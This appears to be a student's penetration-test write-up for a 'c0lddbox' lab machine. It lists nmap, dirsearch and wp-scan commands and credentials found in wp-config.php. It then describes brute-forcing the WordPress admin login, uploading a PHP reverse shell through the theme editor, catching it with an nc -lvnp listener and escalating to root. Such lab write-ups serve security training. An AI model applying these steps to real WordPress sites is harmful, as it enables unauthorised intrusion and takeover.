@@ -1,0 +1,74 @@
+                              Report of c0lddbox.
+About machine:-
+ It is a linux-3.9 based server machine(192.168.0.127), using Apache/2.4.18 server.
+	Technology used by machine are:-
+		1. Apache/2.4.18
+		2. WordPress 4.1.31
+	Ip and Ports:-
+		ip:- 192.168.0.127
+		open port:- 80
+	MAC Address:- 
+		mac:- 08:00:27:C9:6D:2F	
+Vulnerability:-
+	1. Dos
+	2. RCE
+	3. Privilege Escalation
+Used attacking tools:-
+	1. Nmap
+	2. Dirsearch, Subfinder, Sublist3r
+	3. wp-scan
+Used commands:-
+	nmap -sP <ip-range> ## https://drive.google.com/file/d/19x69ow-Lj9t-leicufEbn0B5FOd-mfU6/view?usp=sharing
+	nmap -A <ip> ## https://drive.google.com/file/d/1jgjJNY10jyyqyTRCCGZcagStODTJ2_0D/view?usp=sharing
+	nmap -Pn <ip> ## https://drive.google.com/file/d/1Nsh7-oSAPIeO99RVfvZXC3hnYji6-s_U/view?usp=sharing
+	nmap --script vuln <ip> ## https://drive.google.com/file/d/1Go9AeBE4MVhiIV_mnTaWKZgB-tOi3bkG/view?usp=sharing
+---------------------------------------
+	dirsearch -u <url>
+	subfinder -d <domain>
+	sublist3r -d <domain>
+---------------------------------------
+	wp-scan --url <url/ip> --usernames <username> --passwords <password/wordlist> ## https://drive.google.com/file/d/1-QfYW4w8dr_2hUP7zLxXpBXB2FGgtyJ1/view?usp=sharing
+---------------------------------------
+	nc -lvnp <port> ## https://drive.google.com/file/d/1l0vUvK4qYUiY-e5Z335ZR92GvIIt3BZt/view?usp=sharing
+---------------------------------------
+	python3 -c ‘import pty;pty.spawn(“/bin/bash”)’ ## https://drive.google.com/file/d/1u5geelzoM1AprAtk61UNjdpyi5tqpLRC/view?usp=sharing
+		Define command use:
+			I used this command for get intractive user shell, because intially we get pseudo terminal which is default terminal state usually used by system software to intract with the hardware. 		  
+	
+	
+Important urls:-
+	1. http://192.168.0.127:80/
+	2. http://192.168.0.127:80/wp-login.php
+	3. http://192.168.0.127:80/hidden/ ## users info
+	4. http://192.168.0.127:80/wp-admin/
+	5. http://192.168.0.127:80/wp-admin/theme-editor.php
+	6. http://192.168.0.127/?m=202010
+	7. http://192.168.0.127/wp-config.php ## important
+		This url is important because it contain database username:-c0ldd and password:- cybersecurity, this config.php file present in /var/www/html/wp-config.php ## https://drive.google.com/file/d/1zJ4yHBiXvaNsAzH0wvpg3z95Kj6pL85M/view?usp=sharing 
+
+BruteForce on admin user(wordpress site login):-
+	Admin username:- C0ldd
+	password:-9876543210
+		NOTE:
+			So because of Dos vulnerability, we easily perform our bruteforce attack on wordpress login.
+Remote Code Execution(rce):-
+	Upload in:- http://192.168.0.127/wp-admin/theme-editor.php
+	Used script:- https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+	Proof of rce(with Pseudoterminal):-
+		https://drive.google.com/file/d/1DrGMjamg9FED_xU3JiUhqzEOv3Krs_SP/view?usp=sharing
+	proof of rce(with Intractive Terminal):- 
+		https://drive.google.com/file/d/12W8ULwUIhNkVnehMBiseW7Fk_251Sd27/view?usp=sharing
+	proor of rce(with root):-
+		https://drive.google.com/file/d/1yvhTvOQcQMwAorKoDbQMfYIaRBK9rlWs/view?usp=sharing
+	  Summary of rce(with root):-
+	    ## https://drive.google.com/file/d/12ULrha1BVTkmZU046jSsbgKRr4rw-akx/view?usp=sharing 
+	    ## https://drive.google.com/file/d/1Oxbr1Wa4md_32wFrBU2d6vgNznmt3mv0/view?usp=sharing
+	    
+			
+			
+So finally I completed this project, and a special thanks for my mentor:- Mr Udai.
+Am, Vivek bhati(0vB1)
+
+Links:
+	GitHub:- https://github.com/vinaygoyal21
+	Twitter:- https://twitter.com/VivekBhati70   
